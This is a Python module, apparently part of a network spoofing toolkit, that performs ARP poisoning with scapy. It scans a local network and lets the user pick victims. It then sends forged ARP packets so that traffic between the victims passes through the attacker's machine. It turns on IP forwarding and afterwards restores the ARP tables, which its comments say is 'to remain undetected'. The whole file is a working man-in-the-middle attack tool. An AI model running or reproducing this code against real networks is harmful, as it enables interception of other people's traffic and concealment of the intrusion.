### IMPORTS ###

from scapy.all import *
import time

# import other files from project
import search_hosts as sh
import spoofing_tool as spoof


### CONSTANTS ###

# number of packets sent in each poisoning phase
START_COUNT = 5 # to start poisoning
MIDDLE_COUNT = 200 # to keep poisoning 
END_COUNT = 3 # to unpoison

# interval (in seconds) to send each packet of each phase
START_INTERVAL = 1 # when poisoning starts
MIDDLE_INTERVAL = 20 # for repoisoning
END_INTERVAL = 1 # when poisoning ends

# token indicating that poisoning should be only one way
ONE_WAY_TOKEN = "__ONE_WAY_TOKEN__"


### FUNCTIONS ###

# Main function that runs the ARP attack
def arp_spoofing(gratuitious, verbose):
    # mute scapy output
    if verbose:
        conf.verb = 0

    # clear terminal and begin keeping track of previous displayed text for UI
    spoof.clear()
    previous_tuples = []

    # enable ip forwarding
    spoof.should_ip_forward(True)
    previous_tuples.append(["IP forwarding enabled!"])
    previous_tuples.append([""])

    previous_tuples.append(["Chosen attack: ARP Poisoning.", 0])
    previous_tuples.append(["-----------------------------"])

    # allow the user to choose an interface for the attack
    iface, previous_tuples = spoof.get_interface(previous_tuples)
    spoof.print_previous(previous_tuples, True)

    # search for active hosts on the network
    active_hosts, previous_tuples = sh.search_hosts(iface, [])

    # allow the user to choose the targets for the attack out of the active hosts
    targets, previous_tuples = choose_arp_targets(active_hosts, previous_tuples)

    # begin the attack by setting this machine as the 'attacker'
    my_details = sh.get_my_details(iface)
    two_way_arp_procedure(targets, my_details["mac"], my_details["ip"], iface, gratuitious)

# Function to let the user pick number of targets and 
# which ip's they are out of the active hosts.
#
# passed argument {@previous_tuples} for correct UI (terminal printing)
def choose_arp_targets(active_hosts, previous_tuples):
    spoof.printf("")
    previous_tuples.append([""])
    spoof.printf("Input number of targets for the attack:", 1)
    previous_tuples.append(["Input number of targets for the attack:", 1])

    # get the number of active hosts from the user
    num_targets = int(spoof.inputf(previous_tuples))
    previous_tuples.append([str(num_targets), 7])

    # if user chose too many or too few targets then set targets to 2 as default
    if num_targets < 2 or num_targets > len(active_hosts):
        spoof.printf("Invalid number of targets specified! Defaulting to 2.", 2)
        num_targets = 2

    targets = [] # array of tuples for each target: (IP, MAC)
    past_ips = [] # remember the already chosen ip's

    # choose each separate target
    for i in range(num_targets):
        spoof.printf("")
        previous_tuples.append([""])

        if i == 0:
            spoof.printf("Input IP address of the first target out of the active hosts:", 1)
            previous_tuples.append(["Input IP address of the first target out of the active hosts:", 1])
        else:
            spoof.printf("Input IP address of the next target out of the active hosts:", 1)
            previous_tuples.append(["Input IP address of the next target out of the active hosts:", 1])
        
        # get the targets ip and mac address from the user's input 
        # such that it is not repeating
        curr_target = spoof.validate_ip(active_hosts, past_ips, previous_tuples)
        previous_tuples.append([curr_target["ip"], 7])

        # add the target to the correpsonding arrays
        targets.append((curr_target['mac'], curr_target['ip']))
        past_ips.append(curr_target["ip"])

    return targets, previous_tuples

# Function for poisoning the arp tables of multiple {@targets}
# such that each target thinks the attacker's mac address
# corresponds to the ip's of every other target 
def two_way_arp_procedure(targets, macAtk, ipAtk, iface, gratuitious):
    spoof.clear()
    spoof.printf("Spoofing the connection between", 0)

    to_print_ips = "\t"
    for i in range(len(targets)):
        if i == len(targets) - 1:
            to_print_ips += targets[i][1]
        elif i == len(targets) - 2:
            to_print_ips += targets[i][1] + " and "
        else:
            to_print_ips += targets[i][1] + ", "
    spoof.printf(to_print_ips)
    spoof.printf("")

    # send request packets to initiate the poisoning
    spoof.printf("Starting poisoning... (Use Ctrl+Z to stop and kill the program)", 4)
    poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, targets, macAtk, ipAtk, iface, 1)

    # send reply packets to keep repoisong
    spoof.printf("Poisoning initiated.", 4)
    poison_m_times_every_n_secs(MIDDLE_COUNT, MIDDLE_INTERVAL, time.time(), True, targets, macAtk, ipAtk, iface, 2, gratuitious)

    # at the end restore the arp tables of all targets to normal to remain undetected 
    spoof.printf("Stopping poisoning!!! (Do not kill the program)", 4)
    poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, targets, macAtk, ipAtk, iface, 2)

## Functions to arp poison target 'T1' to think the ip of 'T2' is the mac of the 'attacker' ##
# begin poisoning with request packets
def one_way_arp_start(macT1, ipT1, ipT2, macAtk, ipAtk, iface):
    targets = [(macT1, ipT1), (ONE_WAY_TOKEN, ipT2)]
    poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, targets, macAtk, ipAtk, iface, 1)

# keep the arp table of 'T1' poisoned with reply packets
def one_way_arp(macT1, ipT1, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious):
    targets = [(macT1, ipT1), (ONE_WAY_TOKEN, ipT2)]
    arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious)

# unpoison the arp table of target 'T1' to remain undetected
def one_way_arp_end(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface):
    targets = [(macT1, ipT1), (macT2, ipT2)]
    poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, targets, ONE_WAY_TOKEN, ipAtk, iface, 2)
##

# Function to poison the targets 'm' times every 'n' seconds
#  
# @param should_poison - boolean to determine if it is poisoning or unpoisoning (True = poison, False = unpoison)
# @param pkt_type - the type of packets to be sent (1 = request, 2 = reply)
def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, targets, macAtk, ipAtk, iface, pkt_type, gratuitious=False):
    while m > 0:
        if time.time() - last_sent_time > n: # if n seconds have passed => should poison/unpoison again
            if should_poison:
                arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious)
            else:
                arp_unpoison(targets, macAtk, ipAtk, iface, pkt_type)     
            last_sent_time = time.time()
            m -= 1

# Function to poison the arp tables of all targets 
def arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious):
    for i in range(len(targets) - 1):
        for j in range(i + 1, len(targets)):
            # get the targets details
            macT1 = targets[i][0]
            ipT1  = targets[i][1]            
            macT2 = targets[j][0]
            ipT2  = targets[j][1]

            # either one-way or bi-directional poisoning based on the mac addresses of the targets
            if macT2 == ONE_WAY_TOKEN:
                send_one_directional(macT1, ipT1, ipT2, macAtk, iface, pkt_type, gratuitious)
            elif macT1 == ONE_WAY_TOKEN:
                send_one_directional(macT2, ipT2, ipT1, macAtk, iface, pkt_type, gratuitious)
            else:
                send_bi_directional(ipT2, macT2, ipT1, macT1, macAtk, macAtk, iface, pkt_type, gratuitious)

# Function to unpoison the arp tables of all targets 
def arp_unpoison(targets, macAtk, ipAtk, iface, pkt_type):
    for i in range(len(targets) - 1):
        for j in range(i + 1, len(targets)):
            # get the targets details
            macT1 = targets[i][0]
            ipT1  = targets[i][1]            
            macT2 = targets[j][0]
            ipT2  = targets[j][1]

            # either one-way or bi-directional unpoisoning based on the mac addresses of the targets
            if macAtk == ONE_WAY_TOKEN:
                send_one_directional(macT1, ipT1, ipT2, macT2, iface, pkt_type, False)
            elif macAtk == ONE_WAY_TOKEN:
                send_one_directional(macT2, ipT2, ipT1, macT1, iface, pkt_type, False)
            else:
                send_bi_directional(ipT2, macT2, ipT1, macT1, macT2, macT1, iface, pkt_type, False)    

# Function to build and send an arp packet 
# spoofing the ARP table of target T1 to think that the attacker is target T2 .
def send_one_directional(_macT1, _ipT1, _ipT2, _macAtk, _iface, pkt_type, gratuitious):
    # poison ARP table of the target
    arp_t = build_packet(_macAtk, _ipT2, _macT1, _ipT1, pkt_type, gratuitious)

    # send the packet
    sendp(arp_t, iface=_iface)

# Function to build and send an arp packet 
# spoofing the ARP table of target T1 to think that the attacker is target T2
# and the ARP table of target 2 to think that the attacker is target T1.
def send_bi_directional(_ipM2, _macM2, _ipM1, _macM1, _macM31, _macM32, _iface, pkt_type, gratuitious):
    # poison ARP table of T1
    arp_m1 = build_packet(_macM31, _ipM2, _macM1, _ipM1, pkt_type, gratuitious)
    # poison ARP table of T2
    arp_m2 = build_packet(_macM32, _ipM1, _macM2, _ipM2, pkt_type, gratuitious)

    # send the packets
    sendp([arp_m1, arp_m2], iface=_iface)

# Function to build a malicious/spoofed packet
# such that if it should not be gratuitious 
#       then the packet is sent from the MAC of the attacker and the spoofed IP
#       to the MAC and IP of the victim
# otherwise when it should be gratuitious
#       then the packet is sent from the MAC of the attacker and the spoofed IP
#       to the broadcast MAC and the spoofed IP
# 
# @param gratuitious - if True then broadcast the ARP queries
# @param pkt_type - the type of packets to be sent (1 = request, 2 = reply)
def build_packet(macAttacker, ipToSpoof, macVictim, ipVictim, pkt_type, gratuitious):
    packet = Ether() / ARP()
    packet[Ether].src = macAttacker
    packet[ARP].hwsrc = macAttacker # Send the MAC address of the attacker
    packet[ARP].psrc  = ipToSpoof   # as the spoofed IP address.

    if gratuitious:
        packet[Ether].dst = "ff:ff:ff:ff:ff:ff"
        packet[ARP].hwdst = "ff:ff:ff:ff:ff:ff"
        packet[ARP].pdst  = ipToSpoof
        packet[ARP].op = 2 # always reply
    else:
        packet[ARP].hwdst = macVictim
        packet[ARP].pdst  = ipVictim
        packet[ARP].op = pkt_type # 1 = request, 2 = reply

    return packet